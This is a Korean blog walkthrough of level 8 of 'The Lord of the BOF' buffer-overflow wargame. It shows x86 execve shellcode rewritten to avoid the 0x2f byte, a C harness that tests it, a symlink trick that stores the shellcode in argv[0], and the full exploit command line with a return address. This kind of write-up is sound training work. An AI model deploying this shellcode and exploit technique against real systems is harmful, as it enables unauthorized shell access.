---
layout: post
title: "The Lord of the BOF - Level 8"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level8/1.jpg" | relative_url }}' alt='relative'>  

## 1) orge/timewalker 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level8/2.png" | relative_url }}' alt='relative'>  

이 문제에서는 argc의 개수를 확인합니다. argc가 2가 아니면 프로그램이 강제 종료합니다.  
게다가 argv hunter도 있습니다. argv[1]의 내용을 0으로 덮어 써버립니다.  

그렇다면 argv[0]에 쉘코드를 입력하면 되겠네요.  

## 2) 심볼릭 링크 파일명에 shellcode 넣기  

``` bash
ln -s troll `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*10'`
```

<img data-action="zoom" src='{{ "assets/lob/level8/3.png" | relative_url }}' alt='relative'>  

No such file or directory ?!?!?!?!  
심볼릭 링크 파일명에 쉘코드를 입력하면 될 줄 알았는 데,,,  

이 문제는 프로그램 이름에 \x2f('/')가 포함되어 있기 때문에 발생하였습니다.  
이 문제를 해결하는 방법은 다형성 쉘코드를 사용하는 것입니다.  

## 3) 다형성 쉘코드 (Polymorphin shellcode)?!  

다형성 쉘코드는 다양한 형태의 쉘코드입니다.  
이 문제에서 다형성 쉘코드를 사용하는 이유는 쉘코드에 \x2f를 포함시키지 않기 위해서 입니다.  

쉘코드에 \x2f를 없애기 위해 /bin//sh을 나타내는 코드를 수정하였습니다.  
sh//를 나타내는 0x68732f2f에는 0x27가 포함되어 있으니 
0x34399797과 0x34399798을 더하는 명령어를 추가하여 0x68732f2f(//sh)으로 변경하였습니다.  
/bin 문자열도 0x3734b117 + 0x3734b118 = 0x6e69622f(/bin)으로 변경하였습니다.  

0x2f를 없애는 방법은 다양하지만 결과적으로 system call을 위해 스택에 올라가는 구조는 동일합니다.  

<span style='font-size:1.5em; background-color:#AC58FA'>AFTER</span>

``` c
xor %eax, %eax
push %eax

// sh//
push $0x68732f2f
// nib/
push $0x6e69622f

mov %esp, %ebx
push %eax
push %ebx
mov %esp, %ecx
mov %eax, %edx
mov $0xb, %al
int $0x80
```

<span style='font-size:1.5em; background-color:#AC58FA'>BEFORE</span>

``` c
xor %eax, %eax
push %eax

// sh//
mov $0x34399797, %eax
add 0x34399798, %eax
push %eax
// nib/
mov $0x3734b117, %eax
add $0x3734b118, %eax
push %eax

xor %eax, %eax

mov %esp, %ebx
push %eax
push %ebx
mov %esp, %ecx
mov %eax, %edx
mov $0xb, %al
int $0x80
```

/bin//sh 문자열을 그대로 사용한 쉘코드보다는 길이가 더 길어졌지만 쉘코드에서 \x27를 없애는 데 성공하였습니다.  
쉘코드를 만드는 방법은 <a href="https://hsong2.github.io/ftz/2021/05/24/Hacker-School-FTZ-Shellcode.html">Hacker School FTZ - Shellcode</a>를 참고해주세요.  

``` c
// mksh.c
void main(){
        __asm__ __volatile__(
                "xor %eax, %eax         \n\t"
                "push %eax              \n\t"

                // sh//
                "mov $0x34399797, %eax  \n\t"
                "add $0x34399798, %eax   \n\t"
                "push %eax              \n\t"

                // nib/
                "mov $0x3734b117, %eax  \n\t"
                "add $0x3734b118, %eax  \n\t"
                "push %eax              \n\t"

                "xor %eax, %eax         \n\t"

                "mov %esp, %ebx         \n\t"
                "push %eax              \n\t"
                "push %ebx              \n\t"
                "mov %esp, %ecx         \n\t"
                "mov %eax, %edx         \n\t"
                "mov $0xb, %al          \n\t"
                "int $0x80              \n\t"
        );
}
```

<img data-action="zoom" src='{{ "assets/lob/level8/4.png" | relative_url }}' alt='relative'>  

``` bash
gcc -static -o polsh mksh.c
```

``` bash
objdump -M intel -d polsh | grep \<main\> -A 20
```

<img data-action="zoom" src='{{ "assets/lob/level8/4.png" | relative_url }}' alt='relative'>  

``` bash
//39 byte
\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

<img data-action="zoom" src='{{ "assets/lob/level8/6.png" | relative_url }}' alt='relative'>  

``` c
// runsh.c
char sh[] = "\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
void (*func)();
int main(void)
{
        func = (void*)sh;
        func();
        return 0;
}

```

0x2f를 없앤 쉘코드가 정상적으로 동작하는 것을 확인하였습니다.  

<img data-action="zoom" src='{{ "assets/lob/level8/7.png" | relative_url }}' alt='relative'>  

``` bash
ln -s troll `python -c 'print "\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*10'`
```

0x2f를 없앤 쉘코드를 포함한 심볼릭 링크 파일을 만들었더니 에러 없이 성공적으로 troll의 심볼릭 링크 파일을 만들 수 있습니다.  

## 4) RET에 넣을 주소 임의로 지정하기   

troll.c 소스코드 파일로 test 프로그램을 만들어 gdb로 실행하였습니다.  

<img data-action="zoom" src='{{ "assets/lob/level8/8.png" | relative_url }}' alt='relative'>  

argv[0]이 저장된 위치에서 쉘코드가 위치할 주소를 임의로 대략 파악합니다.  

저는 0xbffffc4c 주소를 선택했습니다.  

## 5) 공격 페이로드 입력하여 BOF 일으키기  

``` bash
./`python -c 'print "\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*10'` `python -c 'print "\x90"*44+"\x4c\xfc\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/lob/level8/9.png" | relative_url }}' alt='relative'>  